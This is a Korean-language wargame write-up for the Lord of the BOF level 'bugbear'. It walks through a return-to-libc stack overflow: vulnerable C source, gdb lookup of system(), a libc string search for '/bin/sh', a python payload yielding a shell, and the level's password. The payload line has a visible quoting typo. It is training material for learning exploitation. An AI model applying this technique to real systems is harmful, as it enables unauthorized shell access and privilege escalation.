# bugbear

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - bugbear
        - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack betrayed you!!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

드디어 RTL 문제가 나왔다. 

write-up을 보면서 빠르게 RTL에 대해서 공부하도록 하자. 

RTL은 library에 있는 system함수에 /bin/sh를 인자로 주어 실행시키는 간단한 방법이다.(writeup이 없어도 간단했을까?)

그럼 system함수와 /bin/sh의 주소를 알아내야 할 것이다. 그러고 나면 생각보다 쉬울 것이다. 

그럼 먼저 system 함수의 위치를 얻어내는 방법을 알아보자. 

gdb로 열어 breakpoint를 main에 걸어주고 실행시킨 다음 print system(p system)을 이용하면 된다.

```assembly
[darkknight@localhost darkknight]$ cp bugbear aaaaaaa
[darkknight@localhost darkknight]$ gdb -q aaaaaaa
(gdb) b* main
Breakpoint 1 at 0x8048430
(gdb) p system
No symbol "system" in current context.
(gdb) print system
No symbol "system" in current context.
(gdb) r
Starting program: /home/darkknight/aaaaaaa

Breakpoint 1, 0x8048430 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
(gdb) q
```

system함수의 주소는 0x40058ae0이다. 이제 이 주소를 이용하여 /bin/sh의 주소도 알아 보자. 

여기서 코드를 하나 짜야하는데 모르는 부분이라 참고했다.`````

system에서 주소를 하나씩 증가시키면서 /bin/sh와 같아질 때까지 반복문을 돌리면 된다.

```c
[darkknight@localhost darkknight]$ cat find.c
#include <stdio.h>
#include <string.h>

int main(){
        long system=0x40058ae0;
        while(memcmp((void*)system, "/bin/sh", 8))
                system++;
        printf("%p\n", system);
}
[darkknight@localhost darkknight]$ gcc -o find find.c
[darkknight@localhost darkknight]$ ./find
0x400fbff9
```

/bin/sh의 주소는 0x400fbff9이다. 이제 이 두 값을 가지고 공격 코드를 작성한다.



buffer가 40이고 sfp가 4이므로 44bytes를 덥어주고 ret부분에 system함수를 실행시키기위해서 덥어준다. 

그 다음이 중요한데 함수 호출시 EBP+8부분을 첫번째 인자(argv[0])로 사용하기 때문에 4bytes를 덥어주고 

/bin/sh의 주소를 넘겨주도록 한다. 

```bash
[darkknight@localhost darkknight]$ ./bugbear `python -c 'print "\x90"*44+"\xe0\x8a\x05\x40+"\x90"*4+"\xf9\xbf\x0f\x40"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒@▒▒▒▒▒@
bash$ whoami
bugbear
bash$ my-pass
euid = 513
new divide
```

bugbear의 password는 new divide이다.

